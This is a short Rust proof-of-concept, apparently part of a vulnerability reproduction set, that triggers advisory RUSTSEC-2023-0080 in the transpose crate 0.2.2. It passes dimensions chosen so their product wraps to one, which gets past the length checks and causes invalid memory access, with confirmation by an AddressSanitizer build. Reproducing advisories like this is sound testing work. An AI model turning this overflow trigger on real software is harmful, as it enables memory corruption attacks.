//! RUSTSEC-2023-0080 / transpose 0.2.2.
//!
//! The dimensions wrap to a product of one and pass the one-element length
//! checks. The verified oracle requires the pinned nightly ASan build with
//! `-C opt-level=1`; ordinary optimized builds may erase the invalid memory
//! operation under undefined-behavior assumptions.

fn main() {
    let input = std::hint::black_box([0x5a_u8]);
    let mut output = std::hint::black_box([0_u8]);
    let width = std::hint::black_box((1_usize << (usize::BITS - 1)) + 1);
    let height = width;
    transpose::transpose(&input, &mut output, width, height);
    println!("{}", std::hint::black_box(output[0]));
}
